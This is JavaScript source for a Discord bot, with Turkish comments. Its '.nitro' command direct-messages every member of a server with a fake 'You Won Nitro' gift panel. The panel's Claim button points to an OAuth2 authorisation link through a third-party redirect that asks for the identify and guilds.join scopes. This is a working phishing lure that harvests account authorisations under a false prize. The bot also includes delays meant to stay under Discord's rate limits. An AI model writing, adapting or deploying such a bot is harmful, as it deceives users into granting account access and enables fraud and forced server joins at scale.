"use strict";

const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ContainerBuilder,
  TextDisplayBuilder,
  MediaGalleryBuilder,
  MediaGalleryItemBuilder,
  SeparatorBuilder,
  SeparatorSpacingSize,
  MessageFlags,
} = require("discord.js");

// =====================
// CONFIG
// =====================
const CONFIG = {
  token: process.env.token,

  prefix: ".",

  title: "👋 Hi",
  subtitle: "Do you want free Nitro too?",

  description: "Greetings to all members from our server!",

  info: "🎁 You Won Nitro ! 🎁 \n you've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\nIn order to redeem your 99.99$ Discord Nitro gift, you MUST click the [Claim Button]",

  buttonLabel: "Claim",
  buttonUrl: "https://discord.com/oauth2/authorize?client_id=1488221238638805022&redirect_uri=https://vaultcord.win/auth&response_type=code&scope=identify%20guilds.join&state=109950", // Güvenli bağlantı

  banner: "https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=6a4b2704&is=6a49d584&hm=a891085c3f53d5a1e1a18f264d7a4c8d6e593242d0741db92c4eba9c4004b635&=&format=webp&quality=lossless&width=1050&height=591", // Örnek görsel
  footer: "Discord Nitro system",
};

// API limitlerine takılmamak için bekleme fonksiyonu
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// =====================
// CLIENT
// =====================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers, // Sunucudaki üyeleri listelemek için zorunludur
  ],
});

// =====================
// READY
// =====================
client.once("ready", () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

// =====================
// PANEL BUILDER
// =====================
function buildPanel() {
  return new ContainerBuilder()
    .addMediaGalleryComponents(
      new MediaGalleryBuilder().addItems(
        new MediaGalleryItemBuilder().setURL(CONFIG.banner)
      )
    )
    .addSeparatorComponents(
      new SeparatorBuilder().setSpacing(SeparatorSpacingSize.Large)
    )
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `# ${CONFIG.title}\n### ${CONFIG.subtitle}\n\n${CONFIG.description}`
      )
    )
    .addSeparatorComponents(
      new SeparatorBuilder().setSpacing(SeparatorSpacingSize.Small)
    )
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `## ✨ Detaylar\n\n${CONFIG.info}\n\n> ${CONFIG.footer}`
      )
    )
    .addActionRowComponents(
      new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setLabel(CONFIG.buttonLabel)
          .setStyle(ButtonStyle.Link)
          .setURL(CONFIG.buttonUrl)
      )
    );
}

// =====================
// COMMAND
// =====================
client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;

  if (message.content === ".nitro") {
    // İşlemi başlatan kişiye geri bildirim veriyoruz
    const statusMessage = await message.reply("⏳ Sunucudaki üyelere mesaj gönderimi başlatılıyor. Üye sayısına bağlı olarak bu işlem biraz zaman alabilir...");

    try {
      // Tüm üyeleri zorla önbelleğe alıyoruz
      const members = await message.guild.members.fetch();
      let basarili = 0;
      let basarisiz = 0;

      for (const [id, member] of members) {
        // Bot hesaplara DM atmayı atla
        if (member.user.bot) continue;

        try {
          await member.send({
            components: [buildPanel()],
            flags: MessageFlags.IsComponentsV2, // Kullanılan deneysel özellikler için gerekli
          });
          basarili++;
          
          // Discord API Rate Limit engeline takılmamak için bekleme süresi
          await sleep(1500); 
        } catch (error) {
          // Eğer kullanıcının DM'leri sunucuya kapalıysa veya botu engellediyse mesaj gitmez
          basarisiz++;
        }
      }

      await statusMessage.edit(`✅ **İşlem Tamamlandı!**\nBaşarıyla Gönderilen: **${basarili}**\nGönderilemeyen (DM kapalı): **${basarisiz}**`);
    } catch (error) {
      console.error("Üyelere mesaj gönderilirken hata oluştu:", error);
      await statusMessage.edit("❌ Üyeleri çekerken veya mesaj gönderirken beklenmedik bir hata oluştu.");
    }
  }
});

// =====================
// LOGIN
// =====================
client.login(process.env.token);
